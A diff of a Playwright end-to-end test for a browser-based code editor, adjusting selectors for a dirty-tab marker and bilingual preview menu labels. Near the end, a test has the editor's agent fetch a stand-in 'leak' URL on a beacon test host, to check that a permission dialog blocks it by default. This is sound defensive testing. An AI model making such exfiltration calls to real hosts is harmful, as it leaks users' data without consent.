@@ -265,7 +265,7 @@ async function uiFlow(page) {
   ok('C10b están en la lista viva de la paleta (window.elffussClaw.commands)', live.some(e => e.label === 'X2: Sort Lines (fixture)' && e.hint === 'X2 sort'), JSON.stringify(live));
   const ran = await page.evaluate(async () => { await new Promise(r => setTimeout(r, 200)); const e = (await import('/js/ext2/bridge.js')).commands().find(x => x.id === 'x2sort.sortLines'); return e.run(); });
   ok('C11 el comando corre con activeTextEditor definido', ran === 'sorted:3', JSON.stringify(ran));
-  ok('C12 el texto queda ordenado y la pestaña sin guardar', await until(async () => (await value(page)) === 'apple\nfig\npear\n') && await page.evaluate(() => document.querySelector('#tabs-bar .tab.active b')?.className === 'dirty'));
+  ok('C12 el texto queda ordenado y la pestaña sin guardar', await until(async () => (await value(page)) === 'apple\nfig\npear\n') && await page.evaluate(() => !!document.querySelector('#tabs-bar .tab.active .tab-x')?.classList.contains('dirty')));
   await page.evaluate(() => window.monaco.editor.getEditors()[0].focus());
   await page.keyboard.press(`${MOD}+s`);
   const saved = await until(() => page.evaluate(async () => { const o = await navigator.storage.getDirectory(); const t = await (await (await o.getFileHandle('fruits.txt')).getFile()).text(); return t === 'apple\nfig\npear\n' ? t : null; }));
@@ -312,9 +312,10 @@ async function uiFlow(page) {
   await page.evaluate(async () => (await import('/js/ext2/bridge.js')).runCommand('x2sort.sortLines'));
   const marked = await until(() => page.evaluate(async () => ((await (await import('/js/db.js')).get('kv', 'x2.touched')) || {})['page.html'] === true));
   ok('H1 el texto de una extensión marca el fichero (kv x2.touched)', !!marked);
-  const previewVia = async (label = 'Vista previa') => {
+  // el menú sigue el idioma del navegador desde 7d5e790: se busca en los dos
+  const previewVia = async (label = /^(Vista previa|Preview)$/) => {
     await page.click('#tabs-bar .tab.active', { button: 'right' });
-    await page.click(`#tab-menu .tm-item:has-text("${label}")`);
+    await page.locator('#tab-menu .tm-item').filter({ hasText: label }).click();
   };
   await previewVia();
   const gateDlg = await until(() => page.evaluate(() => { const d = document.querySelector('#x2-preview [role="dialog"]'); return d ? { text: d.textContent, focused: document.activeElement?.textContent } : null; }));
@@ -329,7 +330,7 @@ async function uiFlow(page) {
   const shown = await until(() => page.evaluate(() => document.querySelectorAll('#md-preview-pane iframe').length === 1 && !!document.querySelector('#tabs-bar .tab.tab-preview')));
   const cleared = await page.evaluate(async () => !((await (await import('/js/db.js')).get('kv', 'x2.touched')) || {})['page.html']);
   ok('H4 «Previsualizar igualmente» la enseña y quita la marca', !!shown && cleared);
-  await previewVia('Ver código fuente');                     // vuelve al código
+  await previewVia(/^(Ver código fuente|View source)$/);                     // vuelve al código
   // el agente: web.fetch y un runtime del Bridge preguntan; Denegar por defecto
   await page.evaluate(() => { window.__x2fetch = import('/js/tools/index.js').then(m => m.TOOLS['web.fetch'].run({ url: 'https://agent.beacon.test/leak?d=1' })); });
   const agentDlg = await until(() => page.evaluate(() => { const d = document.querySelector('#x2-agent [role="dialog"]'); return d ? { code: d.querySelector('.x2-code').textContent, focused: document.activeElement?.textContent } : null; }));
